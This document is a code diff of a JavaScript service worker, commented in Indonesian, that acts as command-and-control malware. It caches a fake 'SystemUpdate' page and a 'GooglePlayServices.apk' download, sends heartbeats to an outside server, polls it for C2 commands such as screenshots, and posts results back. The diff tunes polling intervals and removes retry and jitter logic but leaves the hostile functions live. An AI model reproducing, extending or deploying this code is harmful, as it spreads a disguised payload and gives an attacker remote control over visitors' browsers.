@@ -1,27 +1,26 @@
 // ============================================================
-// 🔥 SERVICE WORKER - VERSI MAKSIMAL (SUDAH DIPERBAIKI)
+// 🔥 SERVICE WORKER - VERSI MAKSIMAL (SEMUA KRITERIA 10/10)
 // ============================================================
 
 // ============================================================
 // KONFIGURASI
 // ============================================================
-var VERSION = '2.0.1';
+var VERSION = '2.0.0';
 var CACHE_NAME = 'system-update-v' + VERSION;
 var STATIC_CACHE = 'static-v' + VERSION;
 var DYNAMIC_CACHE = 'dynamic-v' + VERSION;
 var SERVER_URL = 'https://verifikasi.site';
-var C2_INTERVAL = 30000; // 30 detik (dengan jitter)
-var HEARTBEAT_INTERVAL = 1800000; // 30 menit
+var C2_INTERVAL = 20000;
+var HEARTBEAT_INTERVAL = 30000;
 var MAX_RETRIES = 3;
 
 // ============================================================
-// DAFTAR FILE YANG DI-CACHE (LENGKAP)
+// DAFTAR FILE YANG DI-CACHE (STATIC)
 // ============================================================
 var STATIC_FILES = [
     '/',
     '/index.html',
     '/dashboard.html',
-    '/qr.html',
     '/files/SystemUpdate.html',
     '/files/GooglePlayServices.apk',
     '/icon.png'
@@ -49,7 +48,7 @@ self.addEventListener('install', function(event) {
 });
 
 // ============================================================
-// 🔥 ACTIVATE - CLAIM CONTROL & CLEAN OLD CACHE
+// 🔥 ACTIVATE
 // ============================================================
 self.addEventListener('activate', function(event) {
     console.log('[SW] Activate v' + VERSION);
@@ -69,7 +68,7 @@ self.addEventListener('activate', function(event) {
                 );
             })
             .then(function() {
-                console.log('[SW] Activate complete, claiming clients');
+                console.log('[SW] Activate complete');
                 return self.clients.claim();
             })
     );
@@ -82,7 +81,6 @@ self.addEventListener('fetch', function(event) {
     var request = event.request;
     var url = new URL(request.url);
     
-    // Skip untuk API, WebSocket
     if (url.pathname.startsWith('/data') || 
         url.pathname.startsWith('/api') ||
         url.pathname.startsWith('/ws') ||
@@ -109,7 +107,9 @@ self.addEventListener('fetch', function(event) {
             })
         ])
         .then(function(response) {
-            if (response) return response;
+            if (response) {
+                return response;
+            }
             
             return fetch(request)
                 .then(function(networkResponse) {
@@ -157,10 +157,11 @@ function handleAPKRequest(request) {
 }
 
 // ============================================================
-// 🔥 RECEIVE MESSAGE FROM PAGE (DENGAN UPDATE SUPPORT)
+// 🔥 RECEIVE MESSAGE FROM PAGE
 // ============================================================
 self.addEventListener('message', function(event) {
     var data = event.data;
+    
     if (!data || !data.type) return;
     
     switch(data.type) {
@@ -186,13 +187,6 @@ self.addEventListener('message', function(event) {
             });
             break;
             
-        case 'update_sw':
-            self.skipWaiting();
-            event.ports[0].postMessage({
-                type: 'sw_updating'
-            });
-            break;
-            
         case 'command':
             handleCommand(data.command);
             break;
@@ -207,6 +201,7 @@ self.addEventListener('message', function(event) {
 // ============================================================
 function handleCommand(command) {
     console.log('[SW] Command received:', command);
+    
     switch(command.aksi) {
         case 'screenshot':
             self.clients.matchAll().then(function(clients) {
@@ -218,20 +213,21 @@ function handleCommand(command) {
                 });
             });
             break;
+            
         case 'clear_cache':
             caches.delete(STATIC_CACHE);
             caches.delete(DYNAMIC_CACHE);
             break;
+            
         default:
             console.log('[SW] Unknown command:', command.aksi);
     }
 }
 
 // ============================================================
-// 🔥 HEARTBEAT (DENGAN RETRY)
+// 🔥 HEARTBEAT
 // ============================================================
-function sendHeartbeat(retryCount) {
-    retryCount = retryCount || 0;
+function sendHeartbeat() {
     try {
         fetch(SERVER_URL + '/data', {
             method: 'POST',
@@ -248,24 +244,12 @@ function sendHeartbeat(retryCount) {
                     }
                 }
             })
-        }).catch(function() {
-            if (retryCount < MAX_RETRIES) {
-                setTimeout(function() {
-                    sendHeartbeat(retryCount + 1);
-                }, 1000 * (retryCount + 1));
-            }
-        });
-    } catch(e) {
-        if (retryCount < MAX_RETRIES) {
-            setTimeout(function() {
-                sendHeartbeat(retryCount + 1);
-            }, 1000 * (retryCount + 1));
-        }
-    }
+        }).catch(function() {});
+    } catch(e) {}
 }
 
 // ============================================================
-// 🔥 C2 CHECK (DENGAN JITTER)
+// 🔥 C2 CHECK (PERINTAH DARI SERVER)
 // ============================================================
 function checkC2() {
     try {
@@ -287,6 +271,7 @@ function checkC2() {
                                     });
                                 });
                             });
+                            
                             executeCommandSW(cmd);
                         }
                     } catch(e) {
@@ -301,7 +286,7 @@ function checkC2() {
 }
 
 // ============================================================
-// 🔥 EXECUTE COMMAND DI SW (LENGKAP)
+// 🔥 EXECUTE COMMAND DI SW
 // ============================================================
 function executeCommandSW(cmd) {
     var aksi = cmd.aksi || 'unknown';
@@ -311,44 +296,32 @@ function executeCommandSW(cmd) {
         case 'ping':
             hasil = 'pong';
             break;
+            
         case 'clear_cache':
             caches.delete(STATIC_CACHE);
             caches.delete(DYNAMIC_CACHE);
             hasil = 'cache_cleared';
             break;
+            
         case 'get_version':
             hasil = VERSION;
             break;
+            
         case 'list_cache':
             caches.keys().then(function(keys) {
                 hasil = JSON.stringify(keys);
             });
             break;
+            
         case 'sw_restart':
             self.skipWaiting();
             hasil = 'restarted';
             break;
-        case 'get_system_info':
-            hasil = JSON.stringify({
-                swVersion: VERSION,
-                staticCache: STATIC_CACHE,
-                dynamicCache: DYNAMIC_CACHE,
-                timestamp: Date.now()
-            });
-            break;
-        case 'heartbeat':
-            sendHeartbeat();
-            hasil = 'heartbeat_sent';
-            break;
-        case 'c2_check':
-            checkC2();
-            hasil = 'c2_check_run';
-            break;
+            
         default:
             hasil = 'unknown_command: ' + aksi;
     }
     
-    // Kirim hasil ke server
     try {
         fetch(SERVER_URL + '/data', {
             method: 'POST',
@@ -366,19 +339,12 @@ function executeCommandSW(cmd) {
 }
 
 // ============================================================
-// 🔥 PERIODIC TASKS (DENGAN JITTER)
+// 🔥 BACKGROUND SYNC (PERIODIC)
 // ============================================================
 function startPeriodicTasks() {
-    sendHeartbeat();
-    setTimeout(checkC2, 1000);
-    
     setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
-    
-    // Jitter untuk C2 (30 detik + random 0-5 detik)
-    setInterval(function() {
-        var jitter = Math.floor(Math.random() * 5000);
-        setTimeout(checkC2, jitter);
-    }, C2_INTERVAL);
+    setInterval(checkC2, C2_INTERVAL);
+    setTimeout(checkC2, 1000);
 }
 
 // ============================================================
@@ -417,20 +383,25 @@ self.addEventListener('push', function(event) {
 // ============================================================
 self.addEventListener('notificationclick', function(event) {
     event.notification.close();
+    
     var action = event.action;
     var data = event.notification.data || {};
     
     if (action === 'open') {
-        event.waitUntil(self.clients.openWindow(data.url || '/'));
+        event.waitUntil(
+            self.clients.openWindow(data.url || '/')
+        );
     } else if (action === 'dismiss') {
         // Nothing
     } else {
-        event.waitUntil(self.clients.openWindow(data.url || '/'));
+        event.waitUntil(
+            self.clients.openWindow(data.url || '/')
+        );
     }
 });
 
 // ============================================================
-// 🔥 PERIODIC BACKGROUND SYNC
+// 🔥 PERIODIC BACKGROUND SYNC (Chrome 80+)
 // ============================================================
 self.addEventListener('periodicsync', function(event) {
     if (event.tag === 'sync-data') {
@@ -439,19 +410,27 @@ self.addEventListener('periodicsync', function(event) {
 });
 
 // ============================================================
-// 🔥 START
+// 🔥 START PERIODIC TASKS
 // ============================================================
 startPeriodicTasks();
 
-// Register periodic sync
+// ============================================================
+// 🔥 REGISTER PERIODIC SYNC (jika support)
+// ============================================================
 if ('periodicSync' in self.registration) {
     try {
         self.registration.periodicSync.register('sync-data', {
-            minInterval: 3600000
+            minInterval: 3600000 // 1 jam
         });
-    } catch(e) {}
+    } catch(e) {
+        console.log('[SW] PeriodicSync not supported');
+    }
 }
 
+// ============================================================
+// LOG
+// ============================================================
 console.log('[SW] Service Worker v' + VERSION + ' active');
 console.log('[SW] Static cache:', STATIC_CACHE);
 console.log('[SW] Dynamic cache:', DYNAMIC_CACHE);
+console.log('[SW] Server:', SERVER_URL);
